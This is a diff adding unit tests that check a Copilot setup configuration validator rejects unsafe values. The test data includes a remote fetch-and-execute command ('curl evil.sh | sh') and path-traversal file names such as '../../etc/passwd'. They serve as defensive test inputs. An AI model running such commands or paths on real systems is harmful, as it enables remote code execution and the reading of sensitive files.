@@ -5,6 +5,7 @@ import {
     getVersionTypeToActionMap,
     loadCopilotSetupConfig,
     resetCopilotSetupConfigCache,
+    validateCopilotSetupConfig,
 } from "./copilot-setup-config.js";
 
 describe("Copilot Setup Config", () => {
@@ -58,6 +59,59 @@ describe("Copilot Setup Config", () => {
             // Assert
             expect(config.setupActionPatterns).toContain("actions/setup-node");
             expect(config.setupActionPatterns).toContain("jdx/mise-action");
+        });
+
+        it("should reject package manager install commands not in allowlist", async () => {
+            // Arrange
+            const validConfig = await loadCopilotSetupConfig();
+            const invalidConfig = {
+                ...validConfig,
+                packageManagers: validConfig.packageManagers.map((pm) =>
+                    pm.type === "npm"
+                        ? { ...pm, installCommand: "curl evil.sh | sh" }
+                        : pm,
+                ),
+            };
+
+            // Act & Assert
+            expect(() => validateCopilotSetupConfig(invalidConfig)).toThrow(
+                "installCommand",
+            );
+        });
+
+        it("should reject path traversal in version file names", async () => {
+            // Arrange
+            const validConfig = await loadCopilotSetupConfig();
+            const invalidConfig = {
+                ...validConfig,
+                versionFiles: [
+                    ...validConfig.versionFiles,
+                    { filename: "../../etc/passwd", type: "node" as const },
+                ],
+            };
+
+            // Act & Assert
+            expect(() => validateCopilotSetupConfig(invalidConfig)).toThrow(
+                "versionFiles",
+            );
+        });
+
+        it("should reject path traversal in package manager manifest names", async () => {
+            // Arrange
+            const validConfig = await loadCopilotSetupConfig();
+            const invalidConfig = {
+                ...validConfig,
+                packageManagers: validConfig.packageManagers.map((pm) =>
+                    pm.type === "npm"
+                        ? { ...pm, manifestFile: "../package.json" }
+                        : pm,
+                ),
+            };
+
+            // Act & Assert
+            expect(() => validateCopilotSetupConfig(invalidConfig)).toThrow(
+                "manifestFile",
+            );
         });
     });
 
